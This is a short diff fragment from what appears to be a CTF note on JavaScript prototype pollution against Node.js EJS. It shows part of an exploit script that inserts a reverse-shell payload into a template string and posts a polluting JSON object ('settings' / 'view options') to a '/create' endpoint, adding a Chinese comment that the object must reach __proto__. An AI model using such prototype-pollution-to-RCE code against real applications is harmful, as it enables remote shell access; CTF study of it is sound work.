@@ -32,7 +32,7 @@ tags:: CTF/JS/原型链污染, CTF/NodeJS/EJS, CTF/NodeJS
 		  """.replace("CMD", repr(reverse_shell_payload))
 		  r = base_post(
 		      url + "/create",
-		      json={
+		      json={ # 这里的对象需要被传入到proto中
 		          "name": "global",
 		          "settings": {
 		              "view options": {
